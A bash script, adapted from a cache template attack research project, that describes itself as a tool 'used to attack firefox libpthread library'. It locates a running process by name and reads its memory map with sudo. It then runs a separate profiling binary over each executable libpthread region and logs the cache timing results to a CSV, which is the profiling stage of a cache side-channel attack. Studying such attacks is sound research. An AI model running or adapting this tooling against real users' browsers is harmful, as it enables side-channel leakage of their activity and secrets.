#!/bin/bash
# This script is used to attack firefox libpthread library.
# This script is adopted from https://github.com/IAIK/cache_template_attacks

if [[ "$3" = "" ]]; then
  echo "usage: ./profiling.sh <sleep before test> <test duration> <processname>"
  exit 0
fi
ps=`ps axww`
ps=`echo "$ps" | grep -v "profiling" | grep "$3" | head -n 1`
if [[ "$ps" = "" ]]; then
  echo process not found
  exit 0
fi
pid=`echo $ps | grep -oE "^ *[0-9]+" | tr -d ' '`
if [[ "$pid" = "" ]]; then
  echo pid not found
  exit 0
fi
truncate -s 0 log.txt
i=$1
while [[ $i -gt 0 ]]; do
  echo "please prepare... starting test in $i seconds..."
  sleep 1
  i=$((i - 1))
done
mem=`sudo cat /proc/$pid/maps | grep "/" | grep -v "(deleted)" | grep -E "(so|locale)" | grep -E "(r-x)" | grep libpthread`
while read -r line; do
  #echo $line
  #echo ./profiling $2 $line
  entry=`./profiling 0 $line 2>&1`
  echo "$entry ./profiling $2 $line"
  ./profiling $2 $line >> $2_firefox_log.csv
done <<< "$mem"

